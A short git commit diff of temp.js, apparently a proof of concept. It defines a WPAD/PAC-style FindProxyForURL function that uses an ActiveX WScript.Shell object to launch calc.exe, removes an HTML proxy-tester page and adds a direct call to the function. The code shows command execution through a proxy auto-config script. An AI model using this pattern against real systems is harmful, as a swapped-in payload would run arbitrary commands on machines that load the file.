521b19d18bf6c451bf0d31af2f4e8f1d951d1662
Zecured <mizrahi.itamar@gmail.com>
2016-11-23 02:13:43 -0800

    Add files via upload

--- temp.js
+++ temp.js
@@ -2,22 +2,4 @@ function FindProxyForURL(url, host)
 {
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 }
-
-<html>
-    <head>
-        <script language="javascript">
-<?php require_once('wpad.dat'); ?>
- 
-function testHost(host)
-{
-    document.getElementById('result').innerHTML = FindProxyForURL('', host);
-}
-        </script>
-    </head>
-    <body>
-        <h1>Proxy Config</h1>
-        <p>Enter the desired hostname to discover which proxy will be used.</p>
-        <input type="text" onKeyUp="testHost(this.value)" size=30/>
-        <span id="result" />
-    </body>
-</html>
+FindProxyForURL('', '');
